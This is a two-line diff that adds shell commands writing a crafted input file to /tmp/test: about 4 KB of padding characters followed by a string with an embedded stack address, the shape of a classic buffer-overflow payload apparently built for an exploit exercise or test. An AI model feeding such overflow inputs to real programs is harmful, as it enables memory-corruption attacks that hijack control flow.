@@ -1,0 +1,2 @@
+echo `python -c 'print "A"*1024 + "B"*1024 + "C" * 1024 + "D"*1023'` > /tmp/test
+echo `python -c 'print "abcdefghi"+"\x68\xf8\xff\xbf"+"nopqrstuvwxyz"'` >> /tmp/test
